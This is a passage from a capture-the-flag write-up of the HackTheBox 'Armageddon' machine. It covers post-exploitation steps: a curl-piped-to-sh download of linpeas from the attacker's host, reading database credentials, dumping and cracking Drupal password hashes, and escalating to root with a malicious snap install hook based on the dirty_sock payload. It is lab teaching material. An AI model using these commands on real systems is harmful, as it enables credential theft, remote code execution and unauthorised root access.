I am not sure if this is a problem with my shell, or the way the box is configured. Looking at the forum people suggested a similar problem, and were given hints to look at another service on the box. I looked for postgres and sqlite binaries too, but didn't find any. So I had a go at downloading linpeas after being unable to find creds manually.

### Linpeas

I started a webserver on my local machine with `python3 -m http.server`, and tried to download linpeas. Annoyingly, we don't seem to be able to change directory with this shell either...

```bash
armageddon.htb>> cd /tmp

armageddon.htb>> pwd
/var/www/html
armageddon.htb>> cd ~

armageddon.htb>> pwd
/var/www/html
```

Let's try and download the file to the CWD rather than `/tmp` (as we cannot even redirect it with `>`)

```bash
armageddon.htb>> wget 10.10.14.53:8000/linpeas.sh 
sh: wget: command not found
armageddon.htb>> curl 10.10.14.53:8000/linpeas.sh
curl: (7) Failed to connect to 10.10.14.53: Permission denied
armageddon.htb>> curl 8.8.8.8
^C[-] The target timed out ~ Net::ReadTimeout with #<TCPSocket:(closed)>
```

Uh oh - that didn't work very well. Perhaps there is a firewall setting on HTB boxes meaning it can't communicate outside of the VPN.

Either way, `curl localhost` works but I cannot hit my box to download linpeas. There may be a firewall setting preventing less well-known ports - I tried again with port 80.

On host machine:

```bash
┌──(mac㉿kali)-[~/Documents/enum]
└─$ sudo python3 -m http.server 80
```

On the box:

```bash
armageddon.htb>> curl 10.10.14.53:80/linpeas.sh | sh
```

It worked!

#### Linpeas Highlights

Potential password:

```bash
[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside key folders (limit 70) - only PHP files
...[snip]...
/var/www/html/sites/default/settings.php:      'password' => 'CQHEy@9M*m23gBVj',
```

Potential interesting backup file:

```bash
[+] Backup files
-rw-r--r--. 1 root root 1735 Oct 30  2018 /etc/nsswitch.conf.bak
```

Active ports:

```bash
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -  
```

Potentially interesting process:

```bash
================================( Processes, Cron, Services, Timers & Sockets )================================
[+] Cleaned processes
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
root       970  0.0  0.3 450272 15500 ?        Ss   12:00   0:00 /usr/sbin/httpd -DFOREGROUND
```

### Password Reuse

I tried to switch user with the found password:

```bash
armageddon.htb>> su brucetherealadmin
Password: su: System error
```

Just like with `mysql`, it errored immediately without letting me input a password.

The source of this password is the `sites/default/settings.php` file, which defines the following array:

```bash
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

Trying to login to mysql with the `drupaluser` username also immediately fails. I also tried returning to the website at this point and logging in with the password as the `drupaluser` and `brucetherealadmin` users, but no luck.

I found some syntax for supplying the password and command on one line, and it worked!

```bash
armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'SHOW DATABASES;'
Database
information_schema
drupal
mysql
performance_schema
```

We can now try and extract some sensitive data (thank god):

```bash
armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'SELECT * FROM users;'
uid	name	pass	mail	theme	signature	signature_format	created	access	login	status	timezone	language	picture	init	data
0						NULL	0	0	0	0	NULL		0		NULL
1	brucetherealadmin	$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt	admin@armageddon.eu			filtered_html	1606998756	1617448243	1617448287	1	Europe/London		0	admin@armageddon.eu	a:1:{s:7:"overlay";i:1;}
3	in7rud3r	$S$DItEwh5TIQW8orD5jrnuU3TJK..ZS2329Q964.okkfbrxymH1nYV	in7rud3r@in7rud3r.com			filtered_html	1617452134	0	0	0	Europe/London		0in7rud3r@in7rud3r.com	NULL
4	in7rud3r_2	$S$DuQ.4iMXzTm.HO3h67gK1Z7r/LzNXKE1zlFcUGQraWDtBURgewrZ	in7rud3r@armageddon.htb			filtered_html	1617452253	0	0	0	Europe/London		0in7rud3r@armageddon.htb	NULL
5	admin	$S$DupmX8rD2AYWEeZB8gPIF4FZIpHnhgAWubZ18pQo3iHBfaITNSt1	asdasd@mail.de			filtered_html	1617454769	0	0	0	Europe/London		0	asdasd@mail.de	NULL
6	test	$S$Da9BDioc9v1pjaulZIP.GehGIviXmcfl0g7tyD96O33hJQbR9YBg	test@test.com			filtered_html	1617454828	0	0	0	Europe/London		0	test@test.com	NULL
```

### Cracking the Password

We can see from hashcat's example hashes that this is a drupal hash (mode 7900). So we can crack it in hashcat using the following command:


```bash
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ hashcat -m 7900 -a 0 hash /usr/share/wordlists/rockyou.txt
```

After a while, this gives us `booboo` as the password:

```bash
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Drupal7
Hash.Target......: $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
Time.Started.....: Sat Apr  3 14:55:24 2021 (8 secs)
Time.Estimated...: Sat Apr  3 14:55:32 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       46 H/s (10.53ms) @ Accel:32 Loops:1024 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 256/14344385 (0.00%)
Rejected.........: 0/256 (0.00%)
Restore.Point....: 224/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:31744-32768
Candidates.#1....: tiffany -> freedom
```

# SSH as brucetherealadmin

As we know `su` was not working, I tried the following command to login as Bruce over SSH instead, supplying "booboo" as the password:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ ssh brucetherealadmin@10.10.10.233
The authenticity of host '10.10.10.233 (10.10.10.233)' can't be established.
ECDSA key fingerprint is SHA256:bC1R/FE5sI72ndY92lFyZQt4g1VJoSNKOeAkuuRr4Ao.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.233' (ECDSA) to the list of known hosts.
brucetherealadmin@10.10.10.233's password: 
Last login: Sat Apr  3 14:48:28 2021 from 10.10.14.151
```

Success!

## Enumeration

Let's take a look at their files. We can grab the user flag now as well:

```bash
[brucetherealadmin@armageddon ~]$ ls -la
total 20
drwx------. 3 brucetherealadmin brucetherealadmin  132 Apr  3 13:23 .
drwxr-xr-x. 4 root              root                49 Apr  3 12:02 ..
lrwxrwxrwx. 1 root              root                 9 Dec 11 19:06 .bash_history -> /dev/null
-rw-r--r--. 1 brucetherealadmin brucetherealadmin   18 Apr  1  2020 .bash_logout
-rw-r--r--. 1 brucetherealadmin brucetherealadmin  193 Apr  1  2020 .bash_profile
-rw-r--r--. 1 brucetherealadmin brucetherealadmin  231 Apr  1  2020 .bashrc
-rw-rw-r--. 1 brucetherealadmin brucetherealadmin 4096 Apr  3 12:01 dedsec.snap
drwx------. 2 brucetherealadmin brucetherealadmin   60 Apr  3 14:39 .gnupg
-r--------. 1 brucetherealadmin brucetherealadmin   33 Apr  3 12:01 user.txt
```

`dedsec.snap` is interesting. Running `sudo -l` shows `snap` can be run as root:

```bash
[brucetherealadmin@armageddon ~]$ sudo -l
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG
    LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE
    LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

Googling "snap install exploit" reveals a number of exploits... including Dirty Sock!

## Dirty Sock Exploit

I first read [an excellent article explaining the exploit](https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html), and a [writeup of running dirty sock](http://www.hackersnotes.com/blog/pentest/linux-privilege-escalation-via-snapd-using-dirty_sock-exploit-and-demonstration-of-cve-2019-7304/) - it contains much the same info as the first article, but with a demo of running the script itself.

This is the [git repository](https://github.com/initstring/dirty_sock) for Dirty Sock.

I wasn't sure this would work out of the box, as I had a feeling we'd need to do some manual exploitation with the `install` command - but let's give it a go.

We'll download the script from git, move it to a `www` directory, and download it to the box.

```bash
┌──(mac㉿kali)-[/opt]
└─$ sudo git clone https://github.com/initstring/dirty_sock.git
Cloning into 'dirty_sock'...

┌──(mac㉿kali)-[/opt/dirty_sock]
└─$ cp dirty_sockv2.py ~/Documents/HTB/armageddon/
┌──(mac㉿kali)-[/opt/dirty_sock]
└─$ cd ~/Documents/HTB/armageddon/
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ mkdir www
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ mv dirty_sockv2.py www/ && cd www/
┌──(mac㉿kali)-[~/Documents/HTB/armageddon/www]
└─$ sudo python3 -m http.server 80
[sudo] password for mac: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.233 - - [03/Apr/2021 16:04:22] "GET /dirty_sockv2.py HTTP/1.1" 200 -
```

On the box:

```bash
[brucetherealadmin@armageddon ~]$ curl 10.10.14.53:80/dirty_sockv2.py > /tmp/sock.py

[brucetherealadmin@armageddon tmp]$ python3 sock.py 

      ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
      |  \ | |__/  |   \_/      [__  |  | |    |_/  
      |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
                       (version 2)

//=========[]==========================================\\
|| R&D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/dirty_sock ||
|| Details || https://initblog.com/2019/dirty-sock     ||
\\=========[]==========================================//


[+] Slipped dirty sock on random socket file: /tmp/escgoauyif;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[!] System may not be vulnerable, here is the API reply:


HTTP/1.1 401 Unauthorized
Content-Type: application/json
Date: Sat, 03 Apr 2021 15:19:42 GMT
Content-Length: 119

{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}
```

Interesting. True enough, the snap version is not vulnerable:

```bash
[brucetherealadmin@armageddon tmp]$ snap version
snap    2.47.1-1.el7
snapd   2.47.1-1.el7
```

We were right that we have to do some manual stuff. Let's recreate the exploit, using @init_string's example of an empty snap script with an install hook.

## Customising the Exploit

I think the path here will be to instead run `snap install` with root privileges, and hope that this runs the install hook.

This didn't work for me, due to hardware issues - however, I'm pretty sure my steps were correct. Nevertheless, if you don't want to read a failed attempt you can [skip to the final exploit](#repurposing-the-dirty-sock-payload).

I don't want to create a user that anyone can log in as, so I'll try to rewrite the exploit to just read the root flag.

```bash
## Install necessary tools
sudo apt install snapcraft -y

## Make an empty directory to work with
cd /tmp
mkdir dirty_snap
cd dirty_snap

## Initialize the directory as a snap project
snapcraft init

## Set up the install hook
mkdir snap/hooks
touch snap/hooks/install
chmod a+x snap/hooks/install

## Write the script we want to execute as root
cat > snap/hooks/install << "EOF"
#!/bin/bash

cat /root/root.txt > /tmp/gottem
EOF

## Configure the snap yaml file
cat > snap/snapcraft.yaml << "EOF"
name: dirty-sock
version: '0.1'
summary: Empty snap, used for exploit
description: |
    See https://github.com/initstring/dirty_sock

grade: devel
confinement: devmode

parts:
  my-part:
    plugin: nil
EOF

## Build the snap
snapcraft
```

It seems snapcraft is not a valid `apt` package on Kali, so I used the snap [installation guide](https://snapcraft.io/docs/installing-snap-on-kali) and snapcraft [installation guide](https://snapcraft.io/docs/snapcraft-overview) to install instead:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ sudo apt install snapd
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ systemctl enable --now snapd apparmor
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ sudo snap install snapcraft --classic
```

Then we need to add `/snap/bin` to path, editing `~/.bashrc`:

```bash
nano ~/.bashrc

...[bashrc file]...
export PATH="/snap/bin:$PATH"
...[bashrc file]...


source ~/.bashrc
```

Then initialise snapcraft:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ snapcraft init
Created snap/snapcraft.yaml.
```

Now we can edit the script's install instructions, commenting them out for now.

My first attempt at running the build script failed, as I had not set a [base](https://snapcraft.io/docs/base-snaps) for snap:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ ./build-snap.sh 
mkdir: cannot create directory ‘dirty_snap’: File exists
Created snap/snapcraft.yaml.
Go to https://docs.snapcraft.io/the-snapcraft-format/8337 for more information about the snapcraft.yaml format.
This snapcraft project does not specify the base keyword, explicitly setting the base keyword enables the latest snapcraft features.
This project is best built on 'Ubuntu 16.04', but is building on a 'Kali GNU/Linux 2021.1' host.
Read more about bases at https://docs.snapcraft.io/t/base-snaps/11198
Sorry, an error occurred in Snapcraft:
Native builds aren't supported on Kali GNU/Linux. You can however use 'snapcraft cleanbuild' with a container.
```

After reading a couple of [similar issues](https://forum.snapcraft.io/t/native-builds-arent-supported-on-manjaro-linux/12821), I added the `base: core18` line to the script:

```bash
## Configure the snap yaml file
cat > snap/snapcraft.yaml << "EOF"
name: dirty-sock
version: '0.1' 
summary: Empty snap, used for exploit
description: |
    See https://github.com/initstring/dirty_sock
base: core18
```

After some [fumbling around](https://forum.snapcraft.io/t/building-for-core18-multipass-issue/8958/12) trying to get `snapcraft` to work on Kali, I found out that `multipass`, the [default build method](https://snapcraft.io/docs/build-options), creates a VM to build the snap within. For a nested VM, this requires acceleration. You can see from the output below that it fails to create the snap:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ ./build-snap.sh 
Created snap/snapcraft.yaml.
Go to https://docs.snapcraft.io/the-snapcraft-format/8337 for more information about the snapcraft.yaml format.
Launching a VM.
Build environment is in unknown state, cleaning first.
WARNING: cgroup v2 is not fully supported yet, proceeding with partial confinement
info failed: The following errors occurred:
instance "snapcraft-dirty-sock" does not exist
WARNING: cgroup v2 is not fully supported yet, proceeding with partial confinement
launch failed: CPU does not support KVM extensions.                             
An error occurred with the instance when trying to launch with 'multipass': returned exit code 2.
Ensure that 'multipass' is setup correctly and try again.
```

I didn't have a Linux host machine, and didn't want to install snap on my Windows host, so I left this for now. But I'd be interested to go back to it and check if it worked.

## Repurposing the Dirty Sock Payload

As I couldn't get this to work myself, I will resort to using the prewritten script. 
I may return to this and try and create the snap on my host machine using WSL, but for now I will use the premade payload in the dirty sock blog and just create the dirty_sock user.

We use a python script to print the blob used in the dirty_sock source code, and base64 encode this:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ python3 print-snap.py | base64 -d > dirty.snap
```

Then we copy this via ssh to the box:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ scp dirty.snap brucetherealadmin@10.10.10.233:/tmp/dirty.snap
```

Now we login as bruce, and install our malicious snap (I used the `--devmode` flag just in case):

```bash
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ ssh brucetherealadmin@10.10.10.233
brucetherealadmin@10.10.10.233's password: 
Last login: Mon Apr  5 15:06:03 2021 from 10.10.14.56
[brucetherealadmin@armageddon ~]$ cd /tmp
[brucetherealadmin@armageddon tmp]$ sudo snap install --devmode dirty.snap 
dirty-sock 0.1 installed
[brucetherealadmin@armageddon tmp]$ su dirty_sock
Password: 
[dirty_sock@armageddon tmp]$ sudo cat /root/root.txt

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for dirty_sock: 
d9...[snip]...a4b

```

That's the box!

![](/assets/images/blogs/Pasted image 20210405151329.png)

Now we can cleanup our snap:

```bash
[dirty_sock@armageddon tmp]$ sudo rm dirty.snap
```

I won't delete the user or change the password, just in case it interferes with someone else's exploit.

### Automation

We can create a very simple bash script to partially automate the above:

```bash
#!/bin/bash
python3 print-snap.py | base64 -d > dirty.snap
scp dirty.snap brucetherealadmin@10.10.10.233:/tmp/dirty.snap
ssh brucetherealadmin@10.10.10.233
```

We then just need to supply Bruce's password and run the dirty snap once we're on the box with `sudo snap install --devmode /tmp/dirty.snap`.